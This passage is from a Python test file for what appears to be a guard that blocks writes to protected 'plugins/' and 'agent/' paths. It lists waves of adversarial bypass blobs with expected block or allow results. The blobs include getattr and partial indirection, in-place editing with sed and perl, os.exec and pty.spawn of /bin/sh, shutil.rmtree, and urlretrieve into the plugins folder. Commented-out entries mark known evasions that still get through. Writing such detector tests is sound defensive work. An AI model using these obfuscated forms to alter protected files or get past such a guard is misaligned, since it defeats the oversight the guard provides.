    # Documented miss: nested method call (two call levels) — p.resolve().joinpath('evil.py') not caught
    # ("p=Path('plugins'); getattr(p.resolve().joinpath('evil.py'),'write_text')('x')", False, "adv024", "getattr_nested_method_miss"),
    # --- ADV-W19-002: extractall and unpack_archive in getattr name list ---
    ("p=Path('plugins'); getattr(zf,'extractall')('plugins/')", True, "adv024", "getattr_extractall_name"),
    ("getattr(s,'unpack_archive')('/tmp/evil.tar','plugins/')", True, "adv024", "getattr_unpack_archive_name"),
    # --- ADV-W19-003: fileinput.FileInput class-constructor form ---
    ("chr(99); fileinput.FileInput('plugins/foo.py', inplace=True)", True, "py", "fileinput_FileInput_inplace"),
    # fileinput.FileInput without inplace: must ALLOW
    ("chr(99); fileinput.FileInput('plugins/foo.py')", False, "py", "fileinput_FileInput_read_FP"),
    # --- ADV-W19-004: partial extended to io.open / io.FileIO / builtins.open ---
    ("chr(99); partial(io.open, 'plugins/evil.py', 'w')", True, "py", "partial_io_open"),
    ("chr(99); partial(io.FileIO, 'plugins/evil.py', 'w')", True, "py", "partial_io_fileio"),
    ("chr(99); partial(builtins.open, 'plugins/evil.py', 'w')", True, "py", "partial_builtins_open"),
    # --- ADV-W19-005: _INPLACE_EDITOR clustered flags -Ei/-iE/-rEi ---
    ("sed -Ei 's/a/b/' plugins/foo.py", True, "fallback", "sed_Ei_clustered"),
    ("sed -iE 's/a/b/' plugins/foo.py", True, "fallback", "sed_iE_clustered"),
    ("sed -rEi 's/a/b/' plugins/foo.py", True, "fallback", "sed_rEi_clustered"),
    # sed -E (no -i) must ALLOW
    ("sed -E 's/a/b/' plugins/foo.py", False, "fallback", "sed_E_no_i_FP"),
    # --- ADV-W19-007: os.replace as write primitive ---
    ("chr(99); os.replace('/tmp/evil.py', 'plugins/foo.py')", True, "py", "os_replace"),
    # os.replace without HR token: ALLOW
    ("chr(99); os.replace('/tmp/a', '/tmp/b')", False, "py", "os_replace_no_hr_FP"),

    # === Wave 20/21 additions ===
    # --- ADV-W20-P1: chained method calls in getattr first-arg ---
    ("p=Path('plugins'); getattr(p.resolve().joinpath('evil.py'),'write_text')('x')", True, "adv024", "getattr_chained_resolve_joinpath"),
    ("p=Path('plugins'); getattr(p.resolve().rename('plugins/evil.py'),'write_text')('x')", True, "adv024", "getattr_chained_three_deep"),
    # --- ADV-W20-P6: unbounded [^)]* call-suffix (was {0,80}) ---
    # Long arg that previously exceeded {0,80} cap: must DENY
    ("p=Path('plugins/evil.py'); getattr(p.joinpath('" + 'a'*85 + "'),'write_text')('x')", True, "adv024", "getattr_longarg_unbounded"),
    # --- ADV-W21-P1: fileinput truthy inplace forms ---
    ("chr(99); fileinput.input('plugins/foo.py', inplace=1)",          True, "py", "fileinput_inplace_int"),
    ("chr(99); fileinput.input('plugins/foo.py', inplace=(True))",     True, "py", "fileinput_inplace_paren"),
    ("chr(99); fileinput.input('plugins/foo.py', inplace=not False)",  True, "py", "fileinput_inplace_not"),
    ("chr(99); fileinput.input('plugins/foo.py', **{'inplace': True})", True, "py", "fileinput_inplace_kwargs"),
    # fileinput.input with inplace=False or no inplace: must ALLOW
    ("chr(99); fileinput.input('plugins/foo.py', inplace=False)",      False, "py", "fileinput_inplace_false_FP"),
    # --- ADV-W21-P2: partial narrowed to write-only Path methods ---
    ("chr(99); partial(Path.write_text, p)",  True,  "py", "partial_Path_write_text"),
    ("chr(99); partial(Path.write_bytes, p)", True,  "py", "partial_Path_write_bytes"),
    ("chr(99); partial(Path.replace, p)",     True,  "py", "partial_Path_replace"),
    # Path read-only methods must ALLOW
    ("chr(99); partial(Path.exists, p)",      False, "py", "partial_Path_exists_FP"),
    ("chr(99); partial(Path.read_text, p)",   False, "py", "partial_Path_read_text_FP"),
    # --- ADV-W21-P3: partial extended to os/subprocess/shutil ---
    ("chr(99); partial(os.system, 'cmd')",            True, "py", "partial_os_system"),
    ("chr(99); partial(subprocess.run, ['cmd'])",     True, "py", "partial_subprocess_run"),
    ("chr(99); partial(shutil.move, '/tmp/x')",       True, "py", "partial_shutil_move"),
    ("chr(99); partial(shutil.unpack_archive, '/tmp/evil.tar')", True, "py", "partial_shutil_unpack"),
    # --- ADV-W21-P5: f/r/b string prefix in getattr name detection ---
    ("p=Path('plugins/evil.py'); getattr(p, f'write_text')('x')",  True, "adv024", "getattr_fstring_name"),
    ("p=Path('plugins/evil.py'); getattr(p, r'open')('x')",        True, "adv024", "getattr_rstring_name"),
    ("p=Path('plugins/evil.py'); getattr(p, b'system')('x')",      True, "adv024", "getattr_bstring_name"),
    # --- ADV-W21-P4: subscript with chain suffix ---
    ("p=Path('plugins/evil.py'); getattr(ps[0].resolve(), 'write_text')('x')", True, "adv024", "getattr_subscript_chain"),

    # === Wave 22 additions (ADV-W22-001..007) ===
    # --- ADV-W22-001: fileinput r-string "" delimiter collision fix ---
    # Truthy non-literal inplace forms (fixed — prior pattern was broken by "" inside r-string)
    ("chr(99); fileinput.input('plugins/foo.py', inplace='True')",      True, "py", "fileinput_inplace_str_true"),
    ("chr(99); fileinput.input('plugins/foo.py', inplace=0.5)",         True, "py", "fileinput_inplace_float"),
    ("chr(99); fileinput.input('plugins/foo.py', inplace=bool(1))",     True, "py", "fileinput_inplace_bool_call"),
    # Explicit falsy forms: must ALLOW
    ("chr(99); fileinput.input('plugins/foo.py', inplace=None)",        False, "py", "fileinput_inplace_none_FP"),
    ("chr(99); fileinput.input('plugins/foo.py', inplace=0)",           False, "py", "fileinput_inplace_int_zero_FP"),
    ("chr(99); fileinput.input('plugins/foo.py', inplace='')",          False, "py", "fileinput_inplace_empty_str_FP"),
    # --- ADV-W22-002: fileinput nested parens in arg (Path(...), os.path.join(...)) ---
    ("chr(99); fileinput.input(Path('plugins/foo.py'), inplace=True)",  True, "py", "fileinput_inplace_Path_arg"),
    ("chr(99); fileinput.input(os.path.join('plugins','foo.py'), inplace=True)", True, "py", "fileinput_inplace_join_arg"),
    # --- ADV-W22-003: partial extended to Path.symlink_to/hardlink_to/unlink, os exec*, check_call, rmtree ---
    ("chr(99); partial(Path.symlink_to, p)",           True, "py", "partial_Path_symlink_to"),
    ("chr(99); partial(Path.hardlink_to, p)",          True, "py", "partial_Path_hardlink_to"),
    ("chr(99); partial(pathlib.Path.unlink, p)",       True, "py", "partial_pathlib_Path_unlink"),
    ("chr(99); partial(os.execv, '/bin/sh', [])",      True, "py", "partial_os_execv"),
    ("chr(99); partial(os.execvpe, 'sh', [], {})",     True, "py", "partial_os_execvpe"),
    ("chr(99); partial(os.symlink, '/tmp/x')",         True, "py", "partial_os_symlink"),
    ("chr(99); partial(os.link, '/tmp/x')",            True, "py", "partial_os_link"),
    ("chr(99); partial(os.remove, 'plugins/x.py')",   True, "py", "partial_os_remove"),
    ("chr(99); partial(os.unlink, 'plugins/x.py')",   True, "py", "partial_os_unlink"),
    ("chr(99); partial(subprocess.check_call, ['cp', 'a', 'plugins/x.py'])", True, "py", "partial_subprocess_check_call"),
    ("chr(99); partial(shutil.rmtree, 'plugins/')",    True, "py", "partial_shutil_rmtree"),
    ("chr(99); partial(shutil.copytree, '/tmp/x')",    True, "py", "partial_shutil_copytree"),
    # --- ADV-W22-005: getattr prefix widened to [bBfFrRuU]{0,2} and triple-quote support ---
    ("p=Path('plugins/evil.py'); getattr(p, F'write_text')('x')",       True, "adv024", "getattr_uppercase_F_prefix"),
    ("p=Path('plugins/evil.py'); getattr(p, R'open')('x')",             True, "adv024", "getattr_uppercase_R_prefix"),
    ("p=Path('plugins/evil.py'); getattr(p, B'system')('x')",           True, "adv024", "getattr_uppercase_B_prefix"),
    ("p=Path('plugins/evil.py'); getattr(p, u'write_text')('x')",       True, "adv024", "getattr_u_prefix"),
    ("p=Path('plugins/evil.py'); getattr(p, '''write_text''')('x')",    True, "adv024", "getattr_triple_single_quote"),
    ("p=Path('plugins/evil.py'); getattr(p, \"\"\"write_text\"\"\")('x')", True, "adv024", "getattr_triple_double_quote"),
    # --- ADV-W22-006: subscript cap removed (was {0,80}) ---
    # 81-char subscript index: must DENY (was a bypass with old {0,80} cap)
    ("p=Path('plugins/evil.py'); getattr(ps[" + "x"*81 + "], 'write_text')('x')", True, "adv024", "getattr_subscript_81chars"),
    # --- ADV-W22-007: HR_REL bare 'plugins'/'agent' without trailing slash ---
    # 'find plugins -name ...' has no trailing slash; must DENY
    ("find plugins -name '*.py' -exec sed -i 's/a/b/' {} +",             True, "fallback", "find_plugins_no_slash"),
    ("cd plugins && sed -i 's/a/b/' evil.py",                            True, "fallback", "cd_plugins_no_slash"),
    # 'myplugins' must NOT match (word boundary)
    ("cd myplugins && echo x > evil.py",                                  False, "fallback", "myplugins_WB_FP"),
    # 'agents' must NOT match (different word)
    ("cd agents && echo x > evil.py",                                     False, "fallback", "agents_WB_FP"),
    # --- ADV-W22-008: getattr name list extended with rmtree/exec*/copy/symlink ---
    ("p=Path('plugins/evil.py'); getattr(shutil, 'rmtree')('plugins/')", True, "adv024", "getattr_rmtree"),
    ("p=Path('plugins/evil.py'); getattr(os, 'execv')('/bin/sh', [])",   True, "adv024", "getattr_execv"),
    ("p=Path('plugins/evil.py'); getattr(shutil, 'copy2')('/tmp','plugins/')", True, "adv024", "getattr_copy2"),
    ("p=Path('plugins/evil.py'); getattr(p, 'symlink_to')('/tmp/x')",   True, "adv024", "getattr_symlink_to"),
    ("p=Path('plugins/evil.py'); getattr(p, 'hardlink_to')('/tmp/x')",  True, "adv024", "getattr_hardlink_to"),
    # --- ADV-W22: getattr name list also covers move/execle/execlp/execvp ---
    ("p=Path('plugins/evil.py'); getattr(shutil, 'move')('/tmp/x', 'plugins/')", True, "adv024", "getattr_move"),
    ("p=Path('plugins/evil.py'); getattr(os, 'execlp')('/bin/sh', [])", True, "adv024", "getattr_execlp"),

    # === Wave 23 additions (ADV-W23) ===
    # --- ADV-W23-001/002: KW+POS split, falsy+terminator lookahead ---
    # Boolean expr: inplace=False or True evaluates truthy; must BLOCK
    ("chr(99); fileinput.input('plugins/foo.py', inplace=False or True)",  True, "py", "fileinput_inplace_bool_expr_kw"),
    # Positional truthy: fileinput.input(files, True) must BLOCK
    ("chr(99); fileinput.input('plugins/foo.py', True)",                   True, "py", "fileinput_inplace_pos_truthy"),
    # Positional falsy: fileinput.input(files, False) must ALLOW
    ("chr(99); fileinput.input('plugins/foo.py', False)",                  False, "py", "fileinput_inplace_pos_false_FP"),
    ("chr(99); fileinput.input('plugins/foo.py', None)",                   False, "py", "fileinput_inplace_pos_none_FP"),
    ("chr(99); fileinput.input('plugins/foo.py', 0)",                      False, "py", "fileinput_inplace_pos_zero_FP"),
    # **dict/vars/locals/globals unpack: must BLOCK
    ("chr(99); fileinput.input('plugins/foo.py', **dict(inplace=True))",   True, "py", "fileinput_inplace_dict_unpack"),
    ("chr(99); fileinput.input('plugins/foo.py', **vars())",               True, "py", "fileinput_inplace_vars_unpack"),
    # --- ADV-W23-003: two-level paren walker in fileinput arg-list ---
    # Two-level nested-paren in first arg: must BLOCK
    ("chr(99); fileinput.input(os.path.join(os.path.dirname(x),'plugins/foo.py'), inplace=True)", True, "py", "fileinput_inplace_2lvl_paren"),
    # --- ADV-W23-004: os.remove/unlink/truncate ---
    ("chr(99); os.remove('plugins/evil.py')",                             True, "py", "os_remove"),
    ("chr(99); os.unlink('plugins/evil.py')",                             True, "py", "os_unlink"),
    ("chr(99); os.truncate('plugins/evil.py', 0)",                        True, "py", "os_truncate"),
    # --- ADV-W23-005: Path.unlink instance method ---
    ("chr(99); p.unlink()",                                               True, "py", "path_unlink_instance"),
    ("chr(99); Path('plugins/evil.py').unlink()",                         True, "py", "path_unlink_Path_constructor"),
    # --- ADV-W23-006: getattr extended names ---
    ("p=Path('plugins/evil.py'); getattr(shutil, 'copytree')('/tmp','plugins/')", True, "adv024", "getattr_copytree"),
    ("p=Path('plugins/evil.py'); getattr(subprocess, 'run')(['cmd'])",    True, "adv024", "getattr_run"),
    ("p=Path('plugins/evil.py'); getattr(subprocess, 'check_output')(['cmd'])", True, "adv024", "getattr_check_output"),
    ("p=Path('plugins/evil.py'); getattr(subprocess, 'check_call')(['cmd'])", True, "adv024", "getattr_check_call"),
    ("p=Path('plugins/evil.py'); getattr(os, 'execlpe')('/bin/sh', [])",  True, "adv024", "getattr_execlpe"),
    ("p=Path('plugins/evil.py'); getattr(os, 'remove')('plugins/x.py')", True, "adv024", "getattr_remove"),
    ("p=Path('plugins/evil.py'); getattr(os, 'link')('/tmp/x', 'plugins/x.py')", True, "adv024", "getattr_link"),
    # --- ADV-W23-007: call-then-subscript first-arg in getattr ---
    ("p=Path('plugins/evil.py'); getattr(globals()['p'], 'write_text')('x')", True, "adv024", "getattr_call_subscript"),
    # --- ADV-W23-HR-REL: agent requires /, plugins keeps bare-word ---
    # plugins without / must BLOCK
    ("find plugins -name '*.py' -exec sed -i 's/a/b/' {} +",              True, "fallback", "find_plugins_bare_W23"),
    ("cd plugins && cat > evil.py << 'EOF'",                              True, "fallback", "cd_plugins_bare_W23"),
    # agent without / must ALLOW (reverted - too many FPs)
    ("agent_name = 'foo'; sed -i 's/a/b/' config.yaml",                   True, "fallback", "agent_name_var_not_hr"),
    # agent with / must still BLOCK
    ("find agent/ -name '*.py' -exec cp {} /tmp/ +",                      True, "fallback", "find_agent_slash_W23"),
    # 'agents' must NOT match (different word)
    ("cd agents && echo x > evil.py",                                     False, "fallback", "agents_WB_FP_W23"),


    # === Wave 24 additions (ADV-W24) ===
    # --- ADV-W24-001: chained subscript in getattr first-arg (ps[0][1], d['k']['s']) ---
    ("p=Path('plugins/evil.py'); getattr(ps[0][1], 'write_text')('x')",    True, "adv024", "getattr_double_subscript"),
    ("p=Path('plugins/evil.py'); getattr(d['k']['s'], 'write_text')('x')", True, "adv024", "getattr_dict_double_subscript"),
    # --- ADV-W24-002: 3-level paren walker in fileinput ---
    ("fileinput.input(a(b(c('plugins/x.py'))), inplace=True)",             True, "py", "fileinput_3lvl_paren"),
    # 4-level is a documented miss (walker only goes 3 deep):
    # ("fileinput.input(a(b(c(d('plugins/x.py')))), inplace=True)",        False, "py", "fileinput_4lvl_paren_miss"),
    # --- ADV-W24-003: os.truncate in partial and getattr ---
    ("partial(os.truncate, 'plugins/x.py')(0)",                            True, "py", "partial_os_truncate"),
    ("p=Path('plugins/evil.py'); getattr(os, 'truncate')('plugins/x.py', 0)", True, "adv024", "getattr_truncate"),
    ("os.truncate('plugins/evil.py', 0)",                                  True, "py", "os_truncate_direct"),
    # --- ADV-W24-004: io.FileIO mode= keyword form ---
    ("io.FileIO('plugins/evil.py', mode='w')",                             True, "py", "io_fileio_mode_kw_w"),
    ("io.FileIO('plugins/evil.py', mode='a')",                             True, "py", "io_fileio_mode_kw_a"),
    ("io.FileIO('plugins/evil.py', mode='r+')",                            True, "py", "io_fileio_mode_kw_rplus"),
    ("io.FileIO('plugins/evil.py', mode='xb')",                            True, "py", "io_fileio_mode_kw_xb"),
    ("io.FileIO('plugins/evil.py', mode='ab+')",                           True, "py", "io_fileio_mode_kw_abplus"),
    # mode=r / mode=rb must ALLOW:
    ("io.FileIO('plugins/evil.py', mode='r')",                             False, "py", "io_fileio_mode_kw_r_FP"),
    ("io.FileIO('plugins/evil.py', mode='rb')",                            False, "py", "io_fileio_mode_kw_rb_FP"),
    # positional mode (ADV-W16-007) still covered:
    ("io.FileIO('plugins/evil.py', 'w')",                                  True, "py", "io_fileio_pos_w_W24_reg"),

    # === Wave 25 additions (ADV-W25) ===
    # --- ADV-W25-001: io.FileIO with nested path arg (os.path.join in first arg) ---
    ("io.FileIO(os.path.join('plugins','evil.py'), 'w')",                  True, "py", "io_fileio_nested_join"),
    ("io.FileIO(os.path.join('plugins','evil.py'), 'a')",                  True, "py", "io_fileio_nested_join_append"),
    # 2-level nesting is a documented miss:
    # ("io.FileIO(os.path.split(os.path.join(a,b))[0], 'w')",             False, "py", "io_fileio_2lvl_miss"),
    # --- ADV-W25-002: io.FileIO chr() dynamic mode ---
    ("io.FileIO('plugins/evil.py', chr(119))",                             True, "py", "io_fileio_chr_mode_pos"),
    ("io.FileIO('plugins/evil.py', chr(97))",                              True, "py", "io_fileio_chr_mode_a"),
    ("io.FileIO('plugins/evil.py', mode=chr(119))",                        True, "py", "io_fileio_chr_mode_kw"),
    # chr() mode with nested path arg:
    ("io.FileIO(os.path.join('plugins','evil.py'), chr(119))",             True, "py", "io_fileio_nested_chr_mode"),
    # --- ADV-W25-003: bare names from import (FileIO, truncate, remove, unlink) ---
    ("from io import FileIO; FileIO('plugins/evil.py', 'w').write(b'x')",  True, "py", "bare_FileIO_from_import"),
    ("from os import truncate; truncate('plugins/evil.py', 0)",            True, "py", "bare_truncate_from_import"),
    ("from os import remove; remove('plugins/evil.py')",                   True, "py", "bare_remove_from_import"),
    ("from os import unlink; unlink('plugins/evil.py')",                   True, "py", "bare_unlink_from_import"),
    # FP guard: bare name without HR token must ALLOW
    ("FileIO('safe/x.py', 'w')",                                           False, "py", "bare_FileIO_no_hr_FP"),
    # --- ADV-W25-004: io.FileIO dict-unpack mode ---
    ("io.FileIO('plugins/evil.py', **{'mode': 'w'})",                      True, "py", "io_fileio_dict_unpack_w"),
    ("io.FileIO('plugins/evil.py', **{'mode': 'a'})",                      True, "py", "io_fileio_dict_unpack_a"),
    ("io.FileIO('plugins/evil.py', **dict(mode='w'))",                     True, "py", "io_fileio_dict_constructor"),
    # dict-unpack read mode must ALLOW (mode='r' has no w/a/x/+):
    ("io.FileIO('plugins/evil.py', **{'mode': 'r'})",                      False, "py", "io_fileio_dict_r_FP"),
    # --- ADV-W25-005: parenthesized subscript in getattr first-arg ---
    ("p=Path('plugins/evil.py'); getattr((ps[0])[1], 'write_text')('x')", True, "adv024", "getattr_paren_subscript"),
    ("p=Path('plugins/evil.py'); getattr((d['k'])[0], 'write_text')('x')", True, "adv024", "getattr_paren_subscript_dict"),
    # --- ADV-W25-006: dotted method-call-then-subscript in getattr first-arg ---
    ("p=Path('plugins/evil.py'); getattr(obj.method()[0], 'write_text')('x')", True, "adv024", "getattr_call_then_subscript"),
    ("p=Path('plugins/evil.py'); getattr(get_paths()['key'], 'write_text')('x')", True, "adv024", "getattr_call_then_dict_subscript"),
    # --- ADV-W25-007: getattr keyword form ---
    ("p=Path('plugins/evil.py'); getattr(object=p, name='write_text')('x')", True, "adv024", "getattr_kw_object"),
    ("p=Path('plugins/evil.py'); getattr(name='write_text', object=p)('x')", True, "adv024", "getattr_kw_name_first"),
    # --- ADV-W25-008: getattr star-unpack ---
    ("p=Path('plugins/evil.py'); getattr(*[p, 'write_text'])('x')",        True, "adv024", "getattr_star_unpack"),
    # star-unpack from variable is a documented miss:
    # ("p=Path('plugins/evil.py'); getattr(*items)('x')",                  False, "adv024", "getattr_star_var_miss"),

    # === Wave 26 additions (ADV-W26) ===
    # --- ADV-W26-001: (open)(...) grouped and [open][N](...) subscript-call ---
    ("(open)('plugins/evil.py', 'w')",                                     True, "adv024", "grouped_open_call"),
    ("[open][0]('plugins/evil.py', 'w')",                                  True, "adv024", "subscript_open_call"),
    # double-paren ((open))('plugins/evil.py', 'w') is a documented miss
    # --- ADV-W26-002: shutil.rmtree in direct shutil group ---
    ("chr(99); shutil.rmtree('plugins/')",                                 True, "py",      "shutil_rmtree_direct"),
    ("chr(99); shutil.rmtree('plugins/', ignore_errors=True)",             True, "py",      "shutil_rmtree_kwargs"),
    # --- ADV-W26-003: paren-wrapped call-then-subscript in getattr first-arg ---
    ("p=Path('plugins/evil.py'); getattr((obj.method()[0]), 'write_text')('x')", True, "adv024", "getattr_paren_call_subscript"),
    ("p=Path('plugins/evil.py'); getattr((obj.a.b()[0]['k']), 'write_text')('x')", True, "adv024", "getattr_paren_deep_call_subscript"),
    # --- ADV-W26-004: star-unpack tuple form getattr(*(p, 'write_text')) ---
    ("p=Path('plugins/evil.py'); getattr(*(p, 'write_text'))('x')",        True, "adv024", "getattr_star_tuple"),
    # --- ADV-W26-004b: FileIO in getattr name list ---
    ("p=Path('plugins/evil.py'); getattr(os, 'FileIO')('plugins/evil.py', 'w')", True, "adv024", "getattr_FileIO_name"),
    # --- ADV-W26-005: os.spawn* and pty.spawn ---
    ("chr(99); os.spawnl(os.P_WAIT, '/bin/sh', 'sh', '-c', 'plugins/x.py')", True, "py",  "os_spawnl"),
    ("chr(99); os.spawnv(os.P_WAIT, '/bin/sh', ['sh'])",                   True, "py",     "os_spawnv"),
    ("chr(99); os.posix_spawn('/bin/sh', [], {})",                          True, "py",     "os_posix_spawn"),
    ("chr(99); pty.spawn('/bin/sh')  # plugins/x.py",                      True, "py",     "pty_spawn"),
    # --- ADV-W26-006: stdlib write constructors ---
    ("chr(99); zipfile.ZipFile('plugins/evil.py', 'w').write('x')",        True, "py",     "zipfile_ZipFile_write"),
    ("chr(99); gzip.open('plugins/evil.py', 'w')",                         True, "py",     "gzip_open_write"),
    ("chr(99); gzip.GzipFile('plugins/evil.py', 'wa')",                    True, "py",     "gzip_GzipFile_wa"),
    ("chr(99); urllib.request.urlretrieve('http://e.com', 'plugins/evil.py')", True, "py",  "urlretrieve"),
    # zipfile read mode must ALLOW:
    ("chr(99); zipfile.ZipFile('plugins/evil.py', 'r')",                   False, "py",    "zipfile_r_FP"),

    # === Wave 27 additions (ADV-W27) ===
    # --- ADV-W27-001: builtins.open and __builtins__ variants ---
    ("builtins.open('plugins/evil.py', 'w')",                              True, "adv024", "builtins_open"),
    ("__builtins__['open']('plugins/evil.py', 'w')",                       True, "adv024", "dunder_builtins_subscript"),
    ("__builtins__.get('open')('plugins/evil.py', 'w')",                   True, "adv024", "dunder_builtins_get"),
    # --- ADV-W27-002: open subscript with any-index (not just alphanumeric) ---
    ("[open][-1]('plugins/evil.py', 'w')",                                 True, "adv024", "subscript_open_neg1"),
    ("[open][ 0 ]('plugins/evil.py', 'w')",                                True, "adv024", "subscript_open_space"),
    ("(open,)[0]('plugins/evil.py', 'w')",                                 True, "adv024", "tuple_subscript_open"),
    # --- ADV-W27-003: open.__call__ and operator.call ---
    ("open.__call__('plugins/evil.py', 'w')",                              True, "adv024", "open_dunder_call"),
    ("operator.call(open, 'plugins/evil.py', 'w')",                        True, "adv024", "operator_call_open"),
    # --- ADV-W27-005: os.posix_spawnp gap ---
    ("chr(99); os.posix_spawnp('/bin/sh', [], {})",                        True, "py",     "os_posix_spawnp"),
    ("chr(99); os.spawnlp(os.P_WAIT, 'sh', 'sh', 'plugins/x.py')",        True, "py",     "os_spawnlp"),
    # --- ADV-W27-006: ZipFile with mode=[wxa] keyword ---
    ("chr(99); zipfile.ZipFile('plugins/evil.py', mode='x').write('x')",   True, "py",     "zipfile_ZipFile_mode_kw"),
    ("chr(99); zipfile.ZipFile('plugins/evil.py', mode='a')",              True, "py",     "zipfile_ZipFile_mode_a_kw"),
    # --- ADV-W27-007: gzip binary modes wb/ab ---
    ("chr(99); gzip.open('plugins/evil.py', 'wb')",                        True, "py",     "gzip_open_wb"),
    ("chr(99); gzip.open('plugins/evil.py', 'ab')",                        True, "py",     "gzip_open_ab"),
    ("chr(99); gzip.GzipFile('plugins/evil.py', 'wb')",                    True, "py",     "gzip_GzipFile_wb"),
    # --- ADV-W27-008: tempfile dir= pointing at plugins/ ---
    ("chr(99); tempfile.NamedTemporaryFile(dir='plugins/')",               True, "py",     "tempfile_NTF_dir"),
    ("chr(99); tempfile.mkstemp(dir='plugins/')",                          True, "py",     "tempfile_mkstemp_dir"),
    ("chr(99); tempfile.mkdtemp(dir='plugins/')",                          True, "py",     "tempfile_mkdtemp_dir"),
    # --- ADV-W27-010: getattr paren-expr + name= keyword combined ---
    ("p=Path('plugins/evil.py'); getattr((obj.method()[0]), name='write_text')('x')", True, "adv024", "getattr_paren_name_kw"),
    # --- ADV-W27-012: open star-unpack and dict-unpack ---
    ("open(*['plugins/evil.py', 'w'])",                                    True, "adv024", "open_star_unpack"),
    ("open(**{'mode': 'w', 'file': 'plugins/evil.py'})",                   True, "adv024", "open_dict_unpack"),
    # --- ADV-W27-013: os.openat and os.unlinkat ---
    ("chr(99); os.openat(0, 'plugins/evil.py', os.O_WRONLY)",              True, "py",     "os_openat"),
    ("chr(99); os.unlinkat(0, 'plugins/evil.py')",                         True, "py",     "os_unlinkat"),
    # --- ADV-W27-014: asyncio create_subprocess ---
    ("chr(99); asyncio.create_subprocess_exec('cp', 'x', 'plugins/y.py')", True, "py",    "asyncio_subprocess_exec"),
    ("chr(99); asyncio.create_subprocess_shell('cp x plugins/y.py')",      True, "py",    "asyncio_subprocess_shell"),
    # --- ADV-W27-015: urllib.request.URLopener ---
    ("chr(99); urllib.request.URLopener().retrieve('http://e.com', 'plugins/evil.py')", True, "py", "url_opener_retrieve"),
    # --- ADV-W27-016: xml.etree.ElementTree.write ---
    ("chr(99); ET.ElementTree(root).write('plugins/evil.py')",             True, "py",     "ET_write"),
    ("chr(99); xml.etree.ElementTree.ElementTree(root).write('plugins/evil.py')", True, "py", "ET_write_full"),
    # open() path cap 300 (raised from 150): blob with 151-char path must BLOCK
    ("open('" + 'a'*151 + "', 'w')",                                       True, "adv024", "open_151char_path"),
    # 301-char path is documented miss with new cap:
    # ("open('" + 'a'*301 + "', 'w')",                                     False, "adv024", "open_301char_path_miss"),

    # ADV-W17-003: from operator import attrgetter; attrgetter('write_text')(p) -> ALLOW
    # Requires import-alias tracking; same class as W16-006.
    # ('from operator import attrgetter; attrgetter(\'write_text\')(p)(\'x\')', False, 'py', 'attrgetter_alias_miss'),

    # === Wave 18 additions (ADV-W18-001..010) ===
    # --- ADV-W18-001: .replace() restored in instance branch (was removed W17-001 due to str.replace FP) ---
    # W17-001 FP (str.replace) belongs in ENCODE gate, not instance branch. Path.replace() IS a write primitive.
    ('chr(99); p.replace(\'plugins/evil.py\')',    True,  "py",      "instance_replace_restored"),
    # str.replace without HR token must ALLOW (FP guard)
    ("chr(99); data = content.replace('a','b')",   False, "py",      "str_replace_noHR_FP"),
    # --- ADV-W18-002: getattr subscript and parenthesized-var first-arg forms ---
    # subscript: getattr(ps[0], 'write_text') where ps[0] is a Path
    ("p=Path('plugins/evil.py'); getattr(ps[0],'write_text')('x')", True, "adv024", "getattr_subscript"),
    # parenthesized var: getattr((p),'write_text') — extra parens around first arg
    ("p=Path('plugins/evil.py'); getattr((p),'write_text')('x')",   True, "adv024", "getattr_paren_var"),
    # --- ADV-W18-003: getattr 'touch' in method names list ---
    # getattr(p, 'touch')() creates/truncates a file — same class as write_text
    ("p=Path('plugins/evil.py'); getattr(p,'touch')()",              True, "adv024", "getattr_touch"),
    # --- ADV-W18-004: io.FileIO/io.open mode widened to [^'"]*[wax+] (catches r+, rb+, mode='r+') ---
    ("chr(99); io.FileIO('plugins/evil.py','r+').write(b'x')",       True, "py",     "io_fileio_r_plus"),
    ("chr(99); io.FileIO('plugins/evil.py','rb+').write(b'x')",      True, "py",     "io_fileio_rb_plus"),
    ("chr(99); io.open('plugins/evil.py','r+').write('x')",          True, "py",     "io_open_r_plus"),
    ("chr(99); io.open('plugins/evil.py','rb+').write('x')",         True, "py",     "io_open_rb_plus"),
    # default (no mode arg) must ALLOW
    ("chr(99); io.FileIO('plugins/foo.py')",                         False, "py",    "io_fileio_nomode_FP_W18"),
    # --- ADV-W18-005: _INPLACE_EDITOR gawk + clustered-flag pattern (?:-(?:in-place|pi)|--in-place|-i\b) ---
    # gawk -i inplace
    ("gawk -i inplace 'NR==1{print}' plugins/x.py",                 True, "fallback", "gawk_inplace"),
    # perl -pi (clustered pi flag)
    ("perl -pi -e 's/x/y/' plugins/foo.py",                         True, "fallback", "perl_pi_clustered"),
    # sed --in-place (long form)
    ("sed --in-place 's/a/b/' plugins/foo.py",                      True, "fallback", "sed_in_place_long"),
    # perl -pe (no -i): dry run, must ALLOW
    ("perl -pe 's/x/y/' plugins/foo.py",                            False, "fallback", "perl_pe_no_i_FP"),
    # --- ADV-W18-006: extractall/unpack_archive in _RENAME_PRIMITIVES ---
    ("chr(99); tar.extractall('plugins/')",                         True, "py",      "extractall_plugins"),
    ("chr(99); shutil.unpack_archive('/tmp/evil.tar','plugins/')",  True, "py",      "unpack_archive_plugins"),
    # No HR token: must ALLOW
    ("chr(99); tar.extractall('/tmp/safe/')",                       False, "py",     "extractall_no_hr_FP"),
    # --- ADV-W18-007/009: patch/ed/ex added to _COPY_VERB ---
    # patch is in-place by default (reads diff from stdin, writes target in-place)
    ("patch < /tmp/evil.patch # plugins/foo.py",                    True, "fallback", "patch_inplace_default"),
    # ed/ex are in-place editors
    ("ed plugins/foo.py < /tmp/commands.txt",                       True, "fallback", "ed_inplace"),
    ("ex +%s/a/b/w plugins/foo.py",                                 True, "fallback", "ex_inplace"),
    # --- ADV-W18-008: fileinput.input(files=..., inplace=True) detection ---
    ("chr(99); fileinput.input('plugins/foo.py', inplace=True)",    True, "py",      "fileinput_inplace"),
    ("chr(99); fileinput.input(files=['plugins/x.py'], inplace=True)", True, "py",   "fileinput_inplace_list"),
    # fileinput.filename() (read-only method) must ALLOW
    ("chr(99); fileinput.filename()",                               False, "py",     "fileinput_filename_FP"),
    # --- ADV-W18-010: functools.partial(open/exec,...) bypass ---
    # Attacker defers open() call via partial to avoid direct 'open(' in blob
    ("chr(99); partial(open, 'plugins/evil.py', 'w')",              True, "py",      "partial_open"),
    ("chr(99); functools.partial(open, 'plugins/evil.py', 'w')",    True, "py",      "partial_open_functools"),
    ("chr(99); partial(exec, 'import os; os.system(\'cmd\'')",       True, "py",      "partial_exec"),
    # partial without write target: must ALLOW (FP guard)
    ("chr(99); partial(print, 'hello')",                            False, "py",     "partial_print_FP"),
]
for blob, want, ctx, label in cases:
    if ctx == "py":
        fires = py_f(blob)
    elif ctx == "sh":
        fires = py_f(blob) or sh_f(blob)
